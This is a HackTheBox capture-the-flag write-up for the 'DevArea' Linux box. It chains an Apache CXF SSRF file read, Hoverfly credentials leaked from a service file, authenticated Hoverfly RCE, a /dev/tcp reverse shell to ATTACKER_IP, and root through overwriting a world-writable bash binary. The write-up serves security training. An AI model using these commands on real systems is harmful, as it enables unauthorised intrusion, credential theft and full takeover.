# DevArea

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2022-46364, Apache CXF SSRF, File Read, Credential Disclosure, CVE-2025-54123, Hoverfly RCE, Bash Hijacking, SUID, SSRF, LFI, RCE, Privilege Escalation
**Date:** 2026-05-15

FTP anonymous access exposes an Apache CXF JAR deployed on Jetty. CVE-2022-46364 SSRF reads the Hoverfly systemd service file, leaking admin credentials. CVE-2025-54123 RCE on Hoverfly v1.11.3 lands a shell as dev_ryan. Root via bash binary hijacking: syswatch.sh runs with sudo and calls /usr/bin/bash internally. Replacing it with a SUID-dropping script gives a root shell.

## 1. Enumeration

Starting with a full-port service scan using Nmap. Six ports open: FTP on 21, SSH on 22, HTTP on 80, and three additional services on 8080, 8500, and 8888.

```bash
nmap -sC -sV -p- <TARGET_IP>

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
8500/tcp open  http    Golang net/http server (proxy)
8888/tcp open  http    Golang net/http server
|_http-title: Hoverfly Dashboard
```

Added `devarea.htb` to `/etc/hosts`. Port 8888 serves a Hoverfly Dashboard. The most immediate lead is anonymous FTP on port 21.

```bash
ftp anonymous@<TARGET_IP>
cd pub
mget *
```

The `pub` directory contains `employee-service.jar` and some supporting class files. Decompiling the JAR reveals it is an Apache CXF SOAP web service. The WSDL is exposed at `http://devarea.htb:8080/employeeservice?wsdl`, confirming the endpoint name and service structure. The version of CXF bundled in the JAR is pre-3.5.5, the range affected by CVE-2022-46364.

## 2. Foothold: CVE-2022-46364 (Apache CXF SSRF)

Apache CXF before version 3.5.5 / 3.4.10 is vulnerable to SSRF via MTOM `XOP:Include`. When a SOAP request includes a multipart MTOM body with an `XOP:Include` element pointing to an arbitrary `href` URL, the CXF server fetches that URL server-side and reflects the content back in the response, base64-encoded. No authentication required. CVSS 9.8 Critical.

This means we can make the server fetch any internal URL or local file path using the `file://` scheme, giving arbitrary file read on the server.

```bash
git clone https://github.com/kasem545/CVE-2022-46364-Poc
python3 CVE-2022-46364.py \
  -t http://devarea.htb:8080/employeeservice \
  -s file:///etc/passwd \
  -d devarea.htb
```

The response base64-decodes to the full `/etc/passwd`, confirming arbitrary file read. `dev_ryan` (uid 1001) has a login shell. Port 8888 runs Hoverfly as a service. The next target is the systemd service file, which typically stores the startup command including any credentials passed as flags.

```bash
python3 CVE-2022-46364.py \
  -t http://devarea.htb:8080/employeeservice \
  -s file:///etc/systemd/system/hoverfly.service \
  -d devarea.htb
```

The service file reveals the full startup command for Hoverfly, including credentials passed directly on the command line:

- ExecStart: `/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0`
- User: `dev_ryan` (Hoverfly runs as this user)

**Result:** Hoverfly admin credentials extracted from service file.

## 3. Shell: CVE-2025-54123 (Hoverfly RCE)

The Hoverfly Dashboard on port 8888 confirms version 1.11.3. This version is vulnerable to authenticated RCE via CVE-2025-54123. An attacker with valid credentials can inject arbitrary OS commands through the middleware configuration endpoint.

Confirming RCE with a simple `id` check:

```bash
./CVE-2025-54123.sh \
  -t http://<TARGET_IP>:8888 \
  -u admin -p O7IJ27MyyXiU \
  -c "id"

# uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

RCE confirmed as `dev_ryan`. Setting up a listener and sending a reverse shell payload:

```bash
# Listener
nc -lvnp 4444

# Payload
./CVE-2025-54123.sh \
  -t http://<TARGET_IP>:8888 \
  -u admin -p O7IJ27MyyXiU \
  -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
```

The shell connects back. Stabilise it with `python3 -c 'import pty; pty.spawn("/bin/bash")'` and `Ctrl+Z` then `stty raw -echo; fg`. The user flag is at `/home/dev_ryan/user.txt`.

**Result:** Interactive shell as `dev_ryan`. User flag at `/home/dev_ryan/user.txt`.

## 4. Privilege Escalation: Bash Binary Hijacking

Running LinPEAS surfaces two findings: a `syswatch-v1.zip` archive in `dev_ryan`'s home directory, and a sudo rule allowing `dev_ryan` to run `/opt/syswatch/syswatch.sh` as root without a password. Inspecting `syswatch.sh` shows the script internally calls `/usr/bin/bash` by absolute path. Checking permissions on that binary:

```bash
ls -la /usr/bin/bash
# -rwxrwxrwx 1 root root 1446024 /usr/bin/bash
```

`/usr/bin/bash` is world-writable. The plan: back up the real binary, replace it with a script that copies the original to `/tmp/rootbash` and sets the SUID bit on it, then trigger `syswatch.sh` via sudo - which calls our fake bash as root, dropping a SUID copy we can use for a root shell.

Back up the real binary and kill any active bash processes holding the file open:

```bash
# Back up the real bash binary
cp /usr/bin/bash /tmp/bash.bak

# Check for processes holding the file open
lsof /usr/bin/bash

# Kill any active bash processes
kill -9 <bash_pid>
```

Overwrite `/usr/bin/bash` with the SUID-dropping script. The shebang points to the backup so the script is a valid executable:

```bash
cat > /usr/bin/bash << 'EOF'
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

chmod +x /usr/bin/bash
```

Trigger the script via sudo. When `syswatch.sh` calls `/usr/bin/bash` it executes our replacement as root - the script copies real bash to `/tmp/rootbash` with the SUID bit set:

```bash
sudo /opt/syswatch/syswatch.sh status

ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root 1446024 /tmp/rootbash

/tmp/rootbash -p
# id
# uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root)
```

The `-p` flag tells bash not to drop the SUID effective UID, giving a shell with `euid=0`. Root flag is at `/root/root.txt`.

**Result:** Root shell obtained.

## 5. Flags

- User: `redacted`
- Root: `redacted`
